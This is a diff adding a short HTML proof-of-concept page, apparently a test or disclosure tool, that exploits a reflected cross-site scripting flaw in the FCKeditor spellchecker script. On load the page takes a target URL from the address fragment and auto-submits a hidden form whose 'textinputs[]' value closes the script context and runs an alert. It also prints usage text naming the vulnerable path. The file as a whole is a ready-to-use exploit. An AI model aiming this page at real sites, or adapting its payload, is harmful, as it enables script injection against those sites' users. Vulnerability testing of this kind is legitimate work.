@@ -1,0 +1,21 @@
+<html>
+<script>
+function onload() {
+	if(window.location.hash) {
+		document.badform.action = window.location.hash.substring(1);
+		document.badform.submit();
+	}
+	else {
+		document.getElementsByName("err").item(0).innerHTML = "Please call this page with URL to exploit in fragment</br></br>Example:  " + window.location.href + "/#http://vulnerable.com//fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php";
+	}
+	
+}
+</script>
+<body onLoad="onload();">
+    <form name="badform" method="post"
+     action="">
+        <input type="hidden" name="textinputs[]" value='");alert("THIS SITE IS XSS VULNERABLE!");</script><!--' />
+    </form>
+    <div name="err"></div>
+</body>
+</html>
